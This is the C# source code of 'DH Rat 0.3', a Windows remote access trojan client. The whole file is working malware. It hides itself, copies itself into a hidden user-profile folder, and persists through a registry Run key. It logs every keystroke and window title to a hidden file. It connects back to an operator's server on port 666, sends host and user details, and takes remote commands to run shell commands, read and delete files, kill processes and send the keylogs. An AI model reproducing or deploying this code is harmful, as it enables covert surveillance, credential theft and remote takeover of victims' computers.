// DH Rat 0.3
// (C) Doddy Hackman 2014
// Credits :  
// Based on "Reverse Connection RAT Example" made by xSilent
// Link : http://www.hackforums.net/showthread.php?tid=827069
// Thanks to xSilent

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

using System.Net.Sockets;
using System.Net; 
using System.IO;
using System.Runtime.InteropServices; 
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Diagnostics;

namespace stub
{
    public partial class Form1 : Form
    {

        static TcpClient conexion_con_el_server = new TcpClient();
        static IPEndPoint datos_para_la_conexion_con_el_server = null;

        string nombre1 = ""; // Declaramos la variable string nombre1 como vacia ("")
        string nombre2 = ""; // Declaramos  la variable string nombre2 como vacia ("")

        // DLL to Keylogger

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr ventana, StringBuilder cadena, int cantidad);

        // DLL to open & close CD

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string comandonow, string retornonow, long longitudnow, long callbacknow);

        //

        //DLL to hide & show taskbar

        [DllImport("user32.dll")]
        public static extern int FindWindow(string clasenow, string textonow);

        //

        // DLL to hide & show desktop icons

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr vennownow, int comandonow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hannow, IntPtr nenow, string clasclasnow, string titulovenganow);
        //

        // DLL to move mouse

        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall)]
        static extern void SetCursorPos(int X, int Y);

        // Functions

        public void savefile(string file, string texto)
        {
            try
            {
                System.IO.StreamWriter save = new System.IO.StreamWriter(file, true);
                save.Write(texto);
                save.Close();
            }
            catch
            {
                //
            }
        }

        public static void cmd_normal(string command)
        {
            try
            {
                System.Diagnostics.Process.Start("cmd", "/c " + command);
            }
            catch
            {
                //
            }
        }

        public static void cmd_hide(string command)
        {
            try
            {
                ProcessStartInfo cmd_now = new ProcessStartInfo("cmd", "/c " + command);
                cmd_now.RedirectStandardOutput = false;
                cmd_now.WindowStyle = ProcessWindowStyle.Hidden;
                cmd_now.UseShellExecute = true;
                Process.Start(cmd_now);
            }
            catch
            {
                //
            }
        }

        public string open_cd()
        {
            string resultado = "";
            try
            {
                mciSendStringA("set CDAudio door open", "", 127, 0);
                resultado = "[?] Open CD : OK";
            }
            catch
            {
                resultado = "[?] Open CD : FAIL";
            }
            return resultado;
        }

        public string close_cd()
        {
            string resultado = "";
            try
            {
                mciSendStringA("set CDAudio door closed", "", 127, 0);
                resultado = "[?] Close CD : OK";
            }
            catch
            {
                resultado = "[?] Close CD : FAIL";
            }
            return resultado;
        }

        public static string hide_taskbar()
        {
            string resultado = "";

            try
            {
                int calculando_int = FindWindow("Shell_TrayWnd", "");
                IntPtr valor_final = new IntPtr(calculando_int);
                ShowWindow(valor_final, 0);
                resultado = "[?] Hide Taskbar : OK";
            }
            catch
            {
                resultado = "[?] Hide Taskbar : FAIL";
            }

            return resultado;
        }

        public static string show_taskbar()
        {
            string resultado = "";

            try
            {
                int calculando_int = FindWindow("Shell_TrayWnd", "");
                IntPtr valor_final = new IntPtr(calculando_int);
                ShowWindow(valor_final, 1);
                resultado = "[?] Show Taskbar : OK";
            }
            catch
            {
                resultado = "[?] Show Taskbar : FAIL";

            }

            return resultado;
        }

        public static string hide_icons()
        {
            string resultado = "";

            try
            {
                IntPtr calculando_int = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
                ShowWindow(calculando_int, 0);
                resultado = "[?] Hide Icons : OK";
            }
            catch
            {
                resultado = "[?] Hide Icons : FAIL";
            }

            return resultado;
        }

        public static string show_icons()
        {
            string resultado = "";
            try
            {
                IntPtr calculando_int = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
                ShowWindow(calculando_int, 1);
                resultado = "[?] Show Icons : OK";
            }
            catch
            {
                resultado = "[?] Show Icons : FAIL";
            }
            return resultado;
        }

        public static string send_keys(string texto)
        {
            string resultado = "";
            try
            {
                SendKeys.Send(texto);
                resultado = "[?] SendKeys : OK";
            }
            catch
            {
                resultado = "[?] SendKeys : FAIL";
            }

            return resultado;
        }

        public static string open_word(string texto)
        {
            string resultado = "";

            try
            {
                cmd_normal("start winword.exe");
                System.Threading.Thread.Sleep(5000);
                send_keys(texto);
                resultado = "[?] OpenWord : OK";
            }
            catch
            {
                resultado = "[?] OpenWord : FAIL";
            }

            return resultado;
        }

        public static string readfile(string file)
        {
            string resultado = "";
            try
            {
                resultado = "[?] Read File : OK\n\n";
                resultado = "[+] Filename : " + file + "\n\n";
                resultado = resultado + "[Source Start]\n";
                string contenido = System.IO.File.ReadAllText(file);
                contenido = contenido.Replace("\r", "");
                contenido = contenido.Replace("\n", "[barra_n]");
                resultado = resultado + contenido;
                resultado = resultado + "\n[Source End]\n";
            }
            catch
            {
                resultado = "[?] Read File : FAIL";
            }
            return resultado;
        }

        public static string console(string cmd)
        {

            string resultado = "";

            try
            {
                resultado = "[+] Command : OK\n\n";
                System.Diagnostics.ProcessStartInfo loadnow = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
                loadnow.RedirectStandardOutput = true;
                loadnow.UseShellExecute = false;
                loadnow.CreateNoWindow = true;
                System.Diagnostics.Process loadnownow = new System.Diagnostics.Process();
                loadnownow.StartInfo = loadnow;
                loadnownow.Start();
                resultado = resultado + "[Source Start]\n";
                string contenido = loadnownow.StandardOutput.ReadToEnd().Trim();
                contenido = contenido.Replace("\r", "");
                contenido = contenido.Replace("\n", "[barra_n]");
                resultado = resultado + contenido;
                resultado = resultado + "\n[Source End]\n";


            }

            catch
            {
                resultado = "[?] Command : FAIL";
            }

            return resultado;

        }

        public static string listar_directorio(string path)
        {
            string resultado = "";
            string directorio = path;

            try
            {

                resultado = "[?] List Directory : OK\n\n";

                List<string> directorios_encontrados = new List<string> { };

                string[] buscando_directorios = System.IO.Directory.GetDirectories(directorio);

                foreach (string directorios in buscando_directorios)
                {
                    directorios_encontrados.Add(directorios);
                }

                List<string> archivos_encontrados = new List<string> { };

                string[] abriendo_archivos = System.IO.Directory.GetFiles(directorio);

                foreach (string archivos in abriendo_archivos)
                {
                    archivos_encontrados.Add(archivos);
                }

                resultado = resultado + "[+] Directory Founds : " + directorios_encontrados.Count + "\n\n";

                foreach (string dirs in directorios_encontrados)
                {
                    resultado = resultado + "[+] Directory : " + dirs + "\n";
                }

                resultado = resultado + "\n[+] Files Found : " + archivos_encontrados.Count + "\n\n";

                foreach (string files in archivos_encontrados)
                {
                    resultado = resultado + "[+] File : " + files + "\n";
                }

            }
            catch
            {
                resultado = "[?] List Directory : FAIL";
            }

            return resultado;
        }

        public static string listar_procesos()
        {
            string resultado = "";
            try
            {
                resultado = resultado + "[?] Get Proccess : OK\n\n";
                Process[] process_encontrados = Process.GetProcesses();

                resultado = resultado + "[Process Found] : " + process_encontrados.Length + "\n\n";

                foreach (Process process_found in process_encontrados)
                {
                    resultado = resultado + "[Process Name] : " + process_found.ProcessName + "\n";
                    resultado = resultado + "[PID] : " + process_found.Id + "\n";
                }
            }
            catch
            {
                resultado = "[?] Get Proccess : FAIL";
            }
            return resultado;
        }

        public string matar_proceso(string nombre)
        {
            string resultado = "";
            try
            {
                resultado = "[?] Kill Process : OK";
                Process[] kill_process = Process.GetProcessesByName(nombre);
                foreach (Process die in kill_process)
                {
                    die.Kill();
                }
            }
            catch
            {
                resultado = "[?] Kill Proccess : FAIL";
            }
            return resultado;
        }

        public static string eliminar_esto(string path)
        {
            string resultado = "";

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);
                    resultado = resultado + "[?] File Deleted : OK";
                }
                catch
                {
                    resultado = resultado + "[?] File Deleted : FAIL";
                }
            }

            if (Directory.Exists(path))
            {
                try
                {
                    string[] archivos_encontrados = Directory.GetFiles(path);
                    foreach (string archivo_a_borrar in archivos_encontrados)
                    {
                        File.Delete(archivo_a_borrar);
                    }

                    Directory.Delete(path);
                    resultado = resultado + "[?] Directory Deleted : OK";
                }
                catch
                {
                    resultado = resultado + "[?] Directory Deleted : FAIL";
                }
            }

            return resultado;
        }

        public static string crazy_mouse(string tiempo)
        {
            string resultado = "";
            try
            {
                for (int posicion_mouse = 0; posicion_mouse < Convert.ToInt32(tiempo); posicion_mouse++)
                {
                    System.Threading.Thread.Sleep(1000);
                    SetCursorPos(posicion_mouse, posicion_mouse);
                }
                resultado = "[?] Crazy Mouse : OK";
            }
            catch
            {
                resultado = "[?] Crazy Mouse : FAIL";
            }

            return resultado;
        }

        //

        public Form1()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            //this.ShowInTaskbar = false;
            this.Visible = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            this.Hide();

            load_config config = new load_config();
            config.load_data();
            //MessageBox.Show(config.get_data());

            string rat_online = config.rat_online;

            if (rat_online == "1")
            {

                string ip = config.ip;

                string directorio_final = Environment.GetEnvironmentVariable("USERPROFILE") + "/sonzon/";

                string ruta_rat_inicial = Application.ExecutablePath;

                string rutadondeestoy = System.Reflection.Assembly.GetEntryAssembly().Location;
                string nombredondestoy = Path.GetFileName(rutadondeestoy);

                string ruta_botnet_final = directorio_final + nombredondestoy;

                if (!Directory.Exists(directorio_final))
                {
                    Directory.CreateDirectory(directorio_final);
                    File.SetAttributes(directorio_final, FileAttributes.Hidden);
                }
                else
                {
                    File.SetAttributes(directorio_final, FileAttributes.Hidden);
                }

                Directory.SetCurrentDirectory(directorio_final);

                try
                {
                    File.Copy(ruta_rat_inicial, ruta_botnet_final);
                    File.SetAttributes(ruta_botnet_final, FileAttributes.Hidden);
                }
                catch
                {
                    //
                }

                if (!File.Exists(directorio_final + "logs.out"))
                {
                    savefile("logs.out", "");
                    File.SetAttributes("logs.out", FileAttributes.Hidden);
                }

                try
                {

                    RegistryKey loadnow = Registry.LocalMachine;
                    loadnow = loadnow.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    loadnow.SetValue("uberku", ruta_botnet_final, RegistryValueKind.String);
                    loadnow.Close();

                }

                catch
                {
                    //
                }
                

                capturar_teclas.Interval = 50;
                capturar_teclas.Enabled = true;

                capturar_ventanas.Interval = 10;
                capturar_ventanas.Enabled = true;

                datos_para_la_conexion_con_el_server = new IPEndPoint(IPAddress.Parse(ip), 666);
                entrar_al_servidor();
            }
            else
            {
                MessageBox.Show("Rat Offline");
                Application.Exit();
            }
        }

        public static void entrar_al_servidor()
        {
            try
            {

                DH_Tools tools = new DH_Tools();

                string consegui_host = "";
                string consegui_ip = "";
                string consegui_pais = "";
                string consegui_user = "";
                string consegui_os = "";
                string os = "";
                string code = tools.toma("http://whatismyipaddress.com/");

                try
                {
                    consegui_host = System.Net.Dns.GetHostName();
                }
                catch
                {
                    consegui_host = "?";
                }

                Match regex = Regex.Match(code, "Click for more about (.*)\"", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    consegui_ip = regex.Groups[1].Value;
                }
                else
                {
                    consegui_ip = "?";
                }

                regex = Regex.Match(code, "Country:</th><td style=\"font-size:14px;\">(.*)</td></tr>", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    consegui_pais = regex.Groups[1].Value;
                }
                else
                {
                    consegui_pais = "?";
                }

                try
                {
                    consegui_user = System.Environment.UserName;
                }
                catch
                {
                    consegui_user = "?";
                }

                try
                {
                    OperatingSystem sistema_operativo = Environment.OSVersion;
                    Version version_del_sistema = sistema_operativo.Version;
                    string version_to_check = version_del_sistema.ToString();

                    if (version_to_check.StartsWith("4.0"))
                    {
                        os = "Windows 95";
                    }
                    else if (version_to_check.StartsWith("4.10"))
                    {
                        os = "Windows 98";
                    }
                    else if (version_to_check.StartsWith("4.90"))
                    {
                        os = "Windows Me";
                    }
                    else if (version_to_check.StartsWith("4.0"))
                    {
                        os = "Windows NT 4.0";
                    }
                    else if (version_to_check.StartsWith("5.0"))
                    {
                        os = "Windows 2000";
                    }
                    else if (version_to_check.StartsWith("5.1"))
                    {
                        os = "Windows XP";
                    }
                    else if (version_to_check.StartsWith("5.2"))
                    {
                        os = "Windows 2003";
                    }
                    else if (version_to_check.StartsWith("6.0"))
                    {
                        os = "Windows Vista";
                    }
                    else if (version_to_check.StartsWith("6.1"))
                    {
                        os = "Windows 7";
                    }

                    else if (version_to_check.StartsWith("6.2"))
                    {
                        os = "Windows 8";
                    }
                    else
                    {
                        os = "?";
                    }

                    consegui_os = os;
                }
                catch
                {
                    os = "?";
                }

                conexion_con_el_server.Connect(datos_para_la_conexion_con_el_server);

                enviar_respuesta("-ACATOY-LLEGUE-ACATOY--"+consegui_host+"--"+consegui_ip+"--"+consegui_pais+"--"+consegui_user+"--"+consegui_os+"--");
                conexion_con_el_server.GetStream().BeginRead(new byte[] { 0 }, 0, 0, leer_datos_del_servidor, null);
            }
            catch
            {
                //
            }
        }

        public static void leer_datos_del_servidor(IAsyncResult now)
        {
            try
            {
                StreamReader abriendo_conexion = new StreamReader(conexion_con_el_server.GetStream()); 
                string contenido = abriendo_conexion.ReadLine();

                Match regex = Regex.Match(contenido, "-Command-OpenCD-Command-", RegexOptions.IgnoreCase);
                if (regex.Success) 
                {
                    mciSendStringA("set CDAudio door open", "", 127, 0);
                    enviar_respuesta("-RtaCommand-[+] OpenCD OK-RtaCommand-"); 
                }

                regex = Regex.Match(contenido, "-Command-CloseCD-Command-", RegexOptions.IgnoreCase); 
                if (regex.Success) 
                {
                    mciSendStringA("set CDAudio door closed", "", 127, 0); 
                    enviar_respuesta("-RtaCommand-[+] CloseCD OK-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-ListDirectory-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = listar_directorio(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n","[barra_n]");
                    enviar_respuesta("-RtaCommand-"+resultado+"-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-Delete-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = eliminar_esto(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-ReadFile-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = readfile(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-SendKeys-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = send_keys(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-OpenWord-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = open_word(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-Message-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = "[+] MessageBox : OK";
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-Talk-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success) 
                {
                    string resultado = "[-] Not available in this version";
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-ListProcess-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = listar_procesos();
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-CMD-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = console(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-CrazyMouse-Command--Arg1-(.*)-Arg1-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = crazy_mouse(regex.Groups[1].Value);
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-HideTaskbar-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = hide_taskbar();
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-ShowTaskbar-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = show_taskbar();
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-HideIcons-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = hide_icons();
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-ShowIcons-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = show_icons();
                    resultado = resultado.Replace("\n", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                regex = Regex.Match(contenido, "-Command-KeyloggerLogs-Command-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    string resultado = readfile("logs.out");
                    contenido = contenido.Replace("\r", "");
                    resultado = resultado.Replace("\n", "[barra_n]");
                    resultado = resultado.Replace("<br>", "[barra_n]");
                    enviar_respuesta("-RtaCommand-" + resultado + "-RtaCommand-");
                }

                conexion_con_el_server.GetStream().BeginRead(new byte[] { 0 }, 0, 0, leer_datos_del_servidor, null); 
            }
            catch
            {
                //
            }
        }

        public static void enviar_respuesta(string texto)
        {
            try
            {
                StreamWriter enviar_respuesta_now = new StreamWriter(conexion_con_el_server.GetStream()); 
                enviar_respuesta_now.WriteLine(texto); 
                enviar_respuesta_now.Flush(); 
            }
            catch
            {
                //
            }
        }

        private void capturar_teclas_Tick(object sender, EventArgs e)
        {
            // Keylogger Based on http://www.blackstuff.net/f44/c-keylogger-4848/
            // Thanks to Carlos Raposo 

            List<string> teclas_izquierdas_numero = new List<string> { "96", "97", "98", "99", "100", "101", "102", "103", "104", "105" };
            List<string> teclas_izquierdas_valor = new List<string> { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };

            for (int numcontrolnumizquierda = 0; numcontrolnumizquierda < teclas_izquierdas_numero.Count; numcontrolnumizquierda++)
            {
                int numeros_izquierda_control = GetAsyncKeyState(Convert.ToInt16(teclas_izquierdas_numero[numcontrolnumizquierda]));
                if (numeros_izquierda_control == -32767)
                {
                    savefile("logs.out", teclas_izquierdas_valor[numcontrolnumizquierda]);
                }
            }

            for (int num = 0; num <= 255; num++)
            {
                int numcontrol = GetAsyncKeyState(num);
                if (numcontrol == -32767)
                {

                    if (num >= 65 && num <= 122)
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.out", letra);
                        }
                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);
                        }
                        else if (Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);

                        }
                        else
                        {
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.out", letra);
                        }
                    }
                    else if (num >= 48 && num <= 57)
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                        {
                            string letra = Convert.ToChar(num - 16).ToString();
                            savefile("logs.out", letra);
                        }
                        else
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);
                        }
                    }
                    else
                    {
                        string letra_rara = Enum.GetName(typeof(Keys), num);
                        savefile("logs.out", "[" + letra_rara + "]");
                    }
                }
            }
        }

        private void capturar_ventanas_Tick(object sender, EventArgs e)
        {
            const int limite = 256;
            StringBuilder buffer = new StringBuilder(limite);
            IntPtr manager = GetForegroundWindow();

            if (GetWindowText(manager, buffer, limite) > 0)
            {
                nombre1 = buffer.ToString();

                if (nombre1 != nombre2)
                {
                    nombre2 = nombre1;
                    savefile("logs.out", "\n[" + nombre2 + "]\n");
                }
            }
        }


    }
}

// The End ?